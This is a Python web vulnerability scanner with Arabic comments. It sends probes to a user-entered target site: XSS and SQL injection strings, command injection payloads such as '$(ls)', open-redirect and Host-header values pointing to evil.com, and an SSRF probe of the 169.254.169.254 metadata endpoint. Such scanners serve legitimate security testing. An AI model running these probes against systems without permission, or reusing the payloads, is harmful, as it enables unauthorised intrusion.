import requests
from urllib.parse import urljoin, urlencode

target = input("🔍 أدخل رابط الموقع الهدف (مثال: https://example.com): ").strip("/")

headers = {
    "User-Agent": "CherkiScanner/3.0",
    "Host": "evil.com"
}

# مسارات وأمثلة للفحص
paths = [
    "/",  # للفحص العام ورؤوس الأمان
    "/admin/",
    "/backup/",
    "/test",
    "/search?q=test",
    "/search?q=<script>alert(1)</script>",
    "/redirect?url=https://evil.com",
    "/login?next=https://evil.com",
    "/?redirect=https://evil.com",
    "/?url=https://evil.com",
    "/?id=1",
    "/product?id=1",
    "/page.php?id=1",
    "/ssrf?url=http://169.254.169.254",  # محاولة SSRF على IP داخلي شهير
    "/?cmd=ls",  # اختبار بسيط لـ command injection
    "/profile?user=123",  # احتمال IDOR
    "/login",
    "/api/auth",
]

sql_payloads = ["' OR '1'='1", "';--", "' AND 1=1--", "' OR 1=1#", '" OR "1"="1']
cmd_payloads = ["; ls", "| ls", "`ls`", "$(ls)"]

def request(url, headers=headers):
    try:
        return requests.get(url, headers=headers, allow_redirects=False, timeout=7)
    except Exception as e:
        print(f"❌ Error requesting {url}: {e}")
        return None

print("\n🔎 بدء الفحص...\n")

for path in paths:
    url = urljoin(target + "/", path.lstrip("/"))
    r = request(url)
    if not r:
        continue

    # 1. Open Redirect
    if "Location" in r.headers and "evil.com" in r.headers["Location"]:
        print(f"🚨 Open Redirect مكتشف: {url}")

    # 2. Reflected XSS (البسيط)
    if "<script>alert(1)</script>" in r.text or "<img src=x onerror=alert(1)>" in r.text:
        print(f"🚨 Reflected XSS: {url}")

    # 3. Clickjacking
    if path == "/" and "X-Frame-Options" not in r.headers:
        print(f"🚨 احتمال Clickjacking: {url}")

    # 4. CORS Misconfig
    if path == "/" and r.headers.get("Access-Control-Allow-Origin") == "https://evil.com":
        print(f"🚨 CORS Misconfiguration: {url}")

    # 5. Directory Listing
    if "Index of /" in r.text and "Parent Directory" in r.text:
        print(f"🚨 Directory Listing مفتوح: {url}")

    # 6. Host Header Injection
    if "evil.com" in r.text or "evil.com" in r.headers.values():
        print(f"🚨 Host Header Injection محتمل: {url}")

    # 7. Missing Security Headers
    missing_headers = []
    for h in ["Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options"]:
        if h not in r.headers:
            missing_headers.append(h)
    if missing_headers:
        print(f"⚠️ غياب رؤوس أمان ({', '.join(missing_headers)}) عند: {url}")

    # 8. SQL Injection (بسيط)
    if "id=" in path or "q=" in path:
        for payload in sql_payloads:
            test_url = url.replace("=1", "=" + payload).replace("=test", "=" + payload)
            r2 = request(test_url)
            if r2 and any(err in r2.text.lower() for err in ["sql syntax", "mysql", "sql error", "near"]):
                print(f"🚨 SQL Injection (بسيط) مكتشف: {test_url}")
                break

    # 9. SSRF (مبسطة)
    if "ssrf" in path:
        test_url = url + "http://169.254.169.254/latest/meta-data/"
        r3 = request(test_url)
        if r3 and "instance-id" in r3.text.lower():
            print(f"🚨 SSRF محتمل: {test_url}")

    # 10. Command Injection (بسيط)
    if "cmd=" in path:
        for payload in cmd_payloads:
            test_url = url.replace("=ls", "=" + payload)
            r4 = request(test_url)
            if r4 and ("bin" in r4.text or "etc" in r4.text):
                print(f"🚨 Command Injection محتمل: {test_url}")
                break

    # 11. IDOR (مراقبة تغيرات رقم المستخدم)
    if "user=" in path:
        for uid in ["123", "124"]:
            test_url = url.replace("=123", "=" + uid)
            r5 = request(test_url)
            if r5 and r5.text != r.text:
                print(f"🚨 IDOR محتمل: {test_url}")
                break

    # 12. فحص نقاط الدخول الخاصة بالمصادقة (اختبار وصول بدون تسجيل)
    if "login" in path or "auth" in path:
        if r.status_code == 200 and "login" in r.text.lower():
            print(f"ℹ️ صفحة تسجيل دخول موجودة: {url}")

print("\n✅ الفحص انتهى.")
